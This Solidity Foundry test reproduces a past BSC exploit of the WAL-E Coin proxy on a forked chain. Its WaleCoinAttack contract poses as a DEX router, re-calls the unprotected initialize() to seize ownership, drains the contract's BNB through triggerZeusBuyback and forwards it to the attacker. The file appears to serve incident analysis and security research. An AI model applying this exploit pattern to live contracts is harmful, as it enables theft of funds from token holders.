// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.415367204023272901 BNB
// Attacker : 0xc49F2938327aa2Cdc3F2F89Ed17b54b3671f05dE
// Attack Contract : 0x07a86AB86C58B894C3722fA8C69065320fAE8883
// Vulnerable Contract : 0x67CEa5e25903c3022eBAF99E67e1898f1De6a75E
// Attack Tx : https://bscscan.com/tx/0xa3607a9db9ef422f19d341f728f5eaff3514358b7fe7d46aaf5de059ca67cd64
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x904d8c8Ac825B70ce893cfdB133899d21e10e8b7#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1279
//
// Attack summary: RewardsChain.initialize(address) can be called after deployment and overwrites the
// owner, router, pair, allowances, and initial supply receiver. The attacker made a malicious router call
// initialize(address(this)), becoming authorized, then called triggerZeusBuyback with the token contract's
// BNB balance. The verified buyback path sent that BNB to the attacker-controlled router, which forwarded it.

address constant ATTACKER = 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE;
address constant ATTACK_CONTRACT = 0x07A86AB86C58b894c3722fa8c69065320FAE8883;
address constant WALE_COIN = 0x67CeA5e25903c3022EBaf99e67e1898F1De6a75E;
address constant REWARDS_CHAIN_IMPL = 0x904D8c8aC825b70cE893Cfdb133899d21E10E8b7;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface IRewardsChain {
    function initialize(
        address dexRouter
    ) external;
    function triggerZeusBuyback(uint256 amount, bool triggerBuybackMultiplier) external;
    function getOwner() external view returns (address);
    function router() external view returns (address);
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_488_106;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Contract");
        vm.label(WALE_COIN, "WAL-E Coin Proxy");
        vm.label(REWARDS_CHAIN_IMPL, "RewardsChain Implementation");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        uint256 contractBnbBefore = WALE_COIN.balance;
        uint256 attackerBalanceBefore = ATTACKER.balance;
        address ownerBefore = IRewardsChain(WALE_COIN).getOwner();
        address routerBefore = IRewardsChain(WALE_COIN).router();

        assertGt(contractBnbBefore, 1 ether);
        assertTrue(ownerBefore != address(0));
        assertTrue(routerBefore != address(0));

        // step 1: deploy an attacker-controlled router and reinitialize the already-live proxy to that router.
        vm.prank(ATTACKER);
        WaleCoinAttack attack = new WaleCoinAttack(payable(ATTACKER));
        attack.execute();

        // step 2: initialize() made the malicious router authorized, so triggerZeusBuyback drained the BNB.
        uint256 attackerProfit = ATTACKER.balance - attackerBalanceBefore;
        assertEq(attackerProfit, contractBnbBefore);
        assertEq(WALE_COIN.balance, 0);
        assertEq(IRewardsChain(WALE_COIN).getOwner(), address(attack));
        assertEq(IRewardsChain(WALE_COIN).router(), address(attack));
        assertGt(IRewardsChain(WALE_COIN).balanceOf(address(attack)), 0);
    }
}

contract WaleCoinAttack {
    address payable private immutable profitReceiver;

    constructor(
        address payable receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        IRewardsChain(WALE_COIN).initialize(address(this));

        uint256 amountToDrain = WALE_COIN.balance;
        IRewardsChain(WALE_COIN).triggerZeusBuyback(amountToDrain, false);

        profitReceiver.transfer(address(this).balance);
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function createPair(address, address) external view returns (address) {
        return address(this);
    }

    function WETH() external pure returns (address) {
        return WBNB_TOKEN;
    }

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256,
        address[] calldata,
        address,
        uint256
    ) external payable {}

    receive() external payable {}
}
